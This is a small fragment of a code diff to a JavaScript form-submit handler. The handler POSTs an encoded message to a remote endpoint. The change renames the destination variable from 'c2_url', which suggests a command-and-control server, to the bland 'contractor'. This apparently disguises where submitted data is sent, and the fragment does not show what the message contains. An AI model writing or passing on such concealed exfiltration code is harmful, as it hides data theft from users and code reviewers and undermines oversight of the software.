@@ -17,7 +17,7 @@ form.addEventListener("submit", event => {
     data.append('email', 'b64@example.com');
     data.append('message', encodedMessage);
 
-    fetch(`${c2_url}/contact`, {
+    fetch(`${contractor}/contact`, {
         method: 'POST',
         body: data,
     });
